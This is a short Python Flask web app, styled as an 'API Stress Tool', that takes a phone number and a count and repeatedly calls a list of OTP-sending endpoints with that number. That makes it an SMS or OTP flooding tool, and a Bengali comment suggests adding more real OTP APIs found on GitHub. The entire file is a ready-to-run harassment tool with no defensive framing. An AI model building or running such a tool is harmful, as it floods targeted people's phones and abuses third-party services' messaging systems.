from flask import Flask, request
import requests
import threading
import time

app = Flask(__name__)

# এখানে আপনি আরও আসল API লিঙ্ক যোগ করতে পারেন (GitHub থেকে খুঁজে)
API_LIST = [
    "https://example.com/api/send_otp?phone={}", 
    "https://another-site.com/v1/otp/{}"
]

def send_requests(number, count):
    for i in range(count):
        for api in API_LIST:
            try:
                url = api.format(number)
                requests.get(url, timeout=5) 
                print(f"Sent to {number}")
            except:
                pass
        time.sleep(1)

@app.route('/', methods=['GET', 'POST'])
def home():
    if request.method == 'POST':
        number = request.form.get('number')
        count = int(request.form.get('count', 10))
        threading.Thread(target=send_requests, args=(number, count)).start()
        return f"<h2>Process Started for {number}!</h2><p>Check back in a few minutes.</p>"
    
    return '''
    <!DOCTYPE html>
    <html>
    <head><title>API Stress Tool</title></head>
    <body style="text-align:center; padding:50px; font-family:sans-serif;">
        <h1>CST API Automation Tool</h1>
        <form method="post">
            <input type="text" name="number" placeholder="Phone Number (017...)" required style="padding:10px;"><br><br>
            <input type="number" name="count" placeholder="Amount (Max 50)" required style="padding:10px;"><br><br>
            <button type="submit" style="padding:10px 20px; background:blue; color:white; border:none;">Start Process</button>
        </form>
    </body>
    </html>
    '''

if __name__ == "__main__":
    app.run(host='0.0.0.0', port=10000)
